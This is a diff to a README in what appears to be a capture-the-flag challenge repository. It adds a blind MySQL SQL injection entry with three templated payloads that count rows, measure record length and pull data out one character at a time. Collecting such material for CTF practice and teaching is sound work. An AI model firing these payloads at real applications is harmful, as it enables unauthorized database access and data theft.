@@ -31,7 +31,11 @@
       
    - Get total record from table [code.py](https://github.com/ByamB4/Common-CTF-Challenges/blob/main/web/sqli/src/mysql_blind_get_total_record.py)
       - `admin' and (SELECT COUNT(*)={guess} FROM {self.SCHEMA_NAME}.{self.TABLE_NAME})#`
-     
+
+   - Get record from table [code.py](https://github.com/ByamB4/Common-CTF-Challenges/blob/main/web/sqli/src/mysql_blind_get_record.py)
+      - `admin' and (SELECT COUNT(*)={guess} FROM {self.SCHEMA_NAME}.{self.TABLE_NAME})#`
+      - `admin' and (SELECT LENGTH((SELECT {self.COLUMN_NAME} FROM {self.SCHEMA_NAME}.{self.TABLE_NAME} ORDER BY {self.ORDER_COLUMN} LIMIT 1 OFFSET {index}))={record_length})#`
+      - `admin' and (SELECT ASCII(SUBSTRING((SELECT {self.COLUMN_NAME} FROM {self.SCHEMA_NAME}.{self.TABLE_NAME} ORDER BY {self.ORDER_COLUMN} LIMIT 1 OFFSET {record_index}),{name_index},1))={ord(guess)})#`
 
 ### Union SQLi
 - Extract number column
